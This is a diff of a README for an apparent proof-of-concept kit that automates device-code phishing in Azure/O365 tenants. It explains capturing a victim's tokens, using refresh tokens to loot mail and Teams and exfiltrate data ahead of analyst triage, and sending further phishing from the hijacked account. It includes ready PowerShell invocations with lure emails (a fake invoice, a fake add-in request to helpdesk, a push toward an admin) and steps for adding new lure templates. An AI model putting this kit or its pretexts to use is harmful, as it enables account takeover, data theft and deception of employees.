@@ -3,7 +3,6 @@
 ### "If you only get one.."
 
 #### Overview
-
 This is a proof-of-concept script kit to assist in device code phishing during Azure/O365 testing. This tool was made to solve one problem - If you only get one chance, and then kicked out immediately, what would you hope you could do in that window? This tool will send a device code in one of the email templates, loot that users email and teams, then send an email as that user to whoever we choose. Use your first target to phish your second from a trusted address. It has optional modules for azurehound and some other recon steps. 
 
 We import TokenTactics and AADInternals, then trigger an authentication flow for the graph and request a device code that is used to sign in. The device code gets replaced in a template and a sign in is prompted for the sending user. This is your pretext. This will give us an access token, and our refresh token. We use our access token with Outlook to send the template to the first user with the codethey need to use. When they enter this code, we get a set of tokens for them. The refresh token allows us to request new access tokens for various other Microsoft services. By refreshing new access tokens for Azure Core Management, MSTeams, Outlook, etc, we're able to move from service to service and pillage what we need without signing in multiple times on multiple sites. This allows for repid exfiltration of data from multiple avenues quicker than an analyst can triage any forthcoming alert. By minting an Outlook token, we can use the new account to send emails to additional targets and control the users mailbox.   
@@ -11,31 +10,72 @@ We import TokenTactics and AADInternals, then trigger an authentication flow for
 Script will check your OS (Windows or Linux) and install the required modules and Azurehound binary needed for post-exploitation activity automatically. That said, this may be buggy on linux, I haven't put it through it's paces there.
 
 #### Usage
+You can use a *very* important project manager as your initial access vector, or someone else you'd like to use to map the tenant and send a link internally to a payload hosted elsewhere. Add modules you wish to run as arguments. You won't need Azurehound, etc, every time, but is a good way to start.
 
-Use a -very- important project manager as your initial access vector, or someone else you'd like to use to map the tenant and send a link internally to a payload hosted elsewhere. Runs azurehound module. You won't need it every time, but is a good way to start.
+The variable firstuser is the initial one you want to hijack, targetUser is the eventual target you hope to reach. Template will be sent first in the background, if the user approves, the message passed here will be emailed to them as the first victim.
 
-The variable firstuser is the one you want to hijack, targetUser is the eventual target you hope to reach. 'Bluebeam' Template will be sent first in the background, if the user approves, the message passed here will be emailed to them as the first victim.
+WARNING: When you get your first bite, SAVE THAT TOKEN LOG. Get the users tokens, and use them for your foothold. You should have a ton of recon, use this info with these tokens and az cli/AzureAD module to make your next moves. The TokenLog gets refreshed every time you run the script. You'll lose them if you arent mindful.  
 
+# Install requirements, perform full recon using azuread, AADInternals, and Azurehound modules, attempt to use payroll account to phish a particular accountant
+```powershell
+$targetUser = "accountant@corpomax.com"
+$firstUser = "payroll@corpomax.com"
+$messageContent = "Hey guys, <p> do you have any idea what this is? We need to pay it really soon, but we're having trouble accounting for it: https://collections.azurewebsites.net/invoice </p>  <p> Sincerely Yours.</p>"
+$subject = "Invoice #3389 for Professional Services "
+$template = "adobe" # or chatgpt, bluebeam, bbb, one of the secret ones 
+
+.\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -azurehound -recon -azuread -install
+```
+
+# With Azurehound and No Installation, phish a PM to phish IT for installation of required software
 ```powershell
 $targetUser = "helpdesk@corpomax.com"
-$firstUser = "ClickamusMaximus@corpomax.com"
-$messageContent = "Hey guys, <p> the client is asking us to install an addin, something to do with the 'period net' framework and PDFs, sounds gross, haha. Can you take a look and see if we can get it installed? Thy're really breathing down our necks https://pdfutil.azurewebsites.net/addin </p> <p> Thanks guys you're the unsung heroes of CorpoMax, they should pay you more! </p> <p> Sincerely Yours.</p>"
+$firstUser = "MaxBedroom@corpomax.com"
+$messageContent = "Hey guys, <p> our client is asking us to install an addin, something to do with the 'net' framework and PDFs, sounds lame, haha. Can you take a look and see if we can get it installed? Thy're really breathing down our necks https://pdfutil.azurewebsites.net/addin </p> <p> Thanks guys you're the best, they should pay you more! </p> <p> Sincerely Yours.</p>"
 $subject = "Software for Project Management"
-$template = "bluebeam" # or chatgpt, or one of the secret ones 
+$template = "bluebeam" # or chatgpt, bluebeam, bbb, one of the secret ones 
 
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -azurehound
 ```
 
-Similar scenario, but trying a different user and the 'chatgpt' template, a little quicker with no installation or Azurehound switch 
+# Phishing Only
+Similar scenario, but trying  to use a new employee to get to a full administrator user via the 'chatgpt' template, a little quicker with no installation or Azurehound switch 
 
 ```powershell
-$targetUser = "helpdesk@corpomax.com"
+$targetUser = "admin@corpomax.com"
 $firstUser = "newemployee@corpomax.com"
 $messageContent = "Hey guys, <p> the client is asking us to install an addin, something to do with the 'period net' framework and PDFs, sounds gross, haha. Can you take a look and see if we can get it installed? Thy're really breathing down our necks https://pdfutil.azurewebsites.net/addin </p> <p> Thanks guys you're the unsung heroes of CorpoMax, they should pay you more! </p> <p> Sincerely Yours.</p>"
 $subject = "Software for Project Management"
 $template = "chatgpt"
 
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template
+```
+
+#### Modules
+It's modular, azurehound is one, AADInternals recon, AzureAD enumeration, etc. Recon.ps1, azuread.ps1, azurehound.ps1 are standalones that take access tokens or whatever params needed to do the thing. You can easily rip these out and use them in your own madness, if you want. I tried to make things as flexible as possible. Once you've mapped the tenant, performed recon and built your new lists you may as well as just use it for additional phishing and omit those switches. 
+
+#### Templates
+Adding a template to this is really easy. Look at the ones here and Replace.ps1, you can see we're looking for and replacing '(((VERIFICATION)))' in the html body. This is the device code that gets generated. If you place one in a new template and add a couple lines of code to Replace.ps1 and Next.ps1 you can use your own.
+
+For replace.ps1, create a new elseif statement for the new template and a template for Chipotle, name the template chipotleHTML.htm and make sure it's creating new version by providing a destination path/filename for what 'replace' creates. I have it creating it in the template folder, it could be a temp folder, you can do whatever you want, I just like to use the repo folder as a workspace. Htm/HTML doesnt matter, consistency does, though. 
+
+```powershell
+elseif($template -eq "chipotle"){
+    $sourceFile = ".\Templates\chipotleHTML.htm"
+    $destinationFile = ".\Templates\chipotle.htm"
+}
+```
+
+For next.ps1, add a switch and a subject, we need to parse what you want from the command line. If it's 'chipotle', put chipotle, 
+```powershell
+
+switch ($template) {
+    "chatgpt" { 
+        $templatePath = ".\Templates\chatgpt.htm"
+        $subjects = @("ChatGPT wants you back.")
+        break 
+    }
+
 ```
 
 #### Phase 1 - Recon
